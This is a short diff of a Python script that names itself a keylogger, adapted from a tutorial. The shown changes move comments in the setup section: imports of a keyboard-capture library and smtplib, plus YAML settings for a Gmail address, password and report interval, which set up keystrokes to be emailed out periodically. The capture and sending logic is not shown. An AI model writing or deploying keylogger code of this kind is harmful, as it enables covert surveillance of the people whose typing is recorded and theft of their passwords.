@@ -1,16 +1,16 @@
 #==============================================================================================================
 # (c) 2020 real-4w, based on https://www.thepythoncode.com/article/write-a-keylogger-python
 #==============================================================================================================
+# Make sure you have a file called "kl.yaml" in the CWD, containing variables as follows:
+#debug : True
+#time : 600                             
+#username : <your email>@gmail.com
+#password : <yourpassword | yourapplicationpassword>
+#==============================================================================================================
 import keyboard # for keylogs 
 import smtplib # for sending email using SMTP protocol (gmail)
 import yaml
 from threading import Semaphore, Timer # Semaphore is for blocking the current thread, Timer is to make a method runs after an `interval` amount of time
-#==============================================================================================================
-# Make sure you have a file called "kl.yaml" in the CWD, containing variables as follows:
-#debug : True
-#time : 600
-#username : <your email>@gmail.com
-#password : <yourpassword | yourapplicationpassword>
 #==============================================================================================================
 def ProcessYAML (yaml_file) :
     '''This function opens the yaml file and returns the data object'''
@@ -19,9 +19,8 @@ def ProcessYAML (yaml_file) :
         debug = y_data['debug']
         if debug == True : print("YAML file:\n", y_data)
     return (y_data, debug) 
-#==============================================================================================================
 yaml_data, debug = ProcessYAML('kl.yaml')                                     #yaml settings are global variables
-#debug = yaml_data['debug'] 
+
 SEND_REPORT_EVERY = yaml_data['time']
 EMAIL_ADDRESS = yaml_data['username']
 EMAIL_PASSWORD = yaml_data['password']
